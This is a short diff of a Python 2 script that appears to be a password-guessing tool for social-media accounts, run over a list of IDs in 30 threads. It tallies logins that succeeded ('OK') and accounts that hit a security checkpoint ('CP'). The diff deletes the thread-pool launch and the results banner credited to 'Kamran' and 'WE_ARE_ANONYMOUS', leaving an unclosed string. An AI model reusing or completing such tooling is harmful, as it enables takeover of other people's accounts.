@@ -226,16 +226,6 @@ def pilih_super():
 																	cek.close()
 																	cekpoint.append(user+pass7)
 																	
-		except:
-			pass
 		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-	print "  \033[1;91m«---------Developed By Kamran------------»" #Dev:WE_ARE_ANONYMOUS.
-	print '\033[1;92mProcess Has Been Completed\033[1;92m....'
-	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print """
-     
 if __name__ == '__main__':
 	login()
